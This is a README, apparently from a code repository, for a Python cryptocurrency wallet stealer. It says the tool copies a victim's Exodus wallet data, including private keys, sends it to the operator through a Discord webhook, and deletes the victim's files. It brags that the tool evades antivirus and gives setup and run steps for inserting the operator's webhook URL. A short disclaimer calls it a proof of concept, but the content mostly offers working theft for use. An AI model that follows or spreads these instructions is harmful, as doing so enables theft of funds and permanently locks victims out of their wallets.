# Exodus Wallet Stealer

Working Exodus Wallet Stealer to steal Exodus wallets, private keys, public keys and crypto in general, the stealer downloads a backup of the exodus appdata and then sends it to you via a discord webhook, once you recieve the webhook message the files are deleted so the wallet can no longer be accessed by the user, you can then download the files and drag and drop them into your appdata and reload your exodus.

After doing this you will have full access to all there stuff including private keys, you could then send and recieve crypto through that account.

The program once compiled properly is not detected by Anti-Virus at all and this makes it very dangerous malware.

I have created an interesting post about this Malware on my website were we go over how to install and prevent it.

https://www.katsu.bio/posts/oLWGiZkBqjC6BpZz

## Video
https://user-images.githubusercontent.com/122122838/228079770-cb0463dc-4afe-4e29-89d5-148389b54730.mp4

## Setup
Download the project files then follow the instructions below.

Open `stealer.py` and change this line:
```bash
Discord_Webhook_Client.send_file("WEBHOOK")
```
Remove **WEBHOOK** and add your Discord webhook URL.
    
## Run the program
You can run the stealer by doing the following command:
```bash
python stealer.py
OR 
python3 stealer.py
```

I recommend that you compile this if you wanted to actually use it and this is what cybercrimals would do however I am not gonna show how you can do this as this project is just a proof of concept and supposed to help fight against malware not make it spread more.

## NOTE:
This program is made to show how malware might work in a way that is safe for the user to run on their machine without causing any damages. I do not condone the spread or compilation of harmful malware, and have not shown how to compile it properly. This is simply a proof of concept.
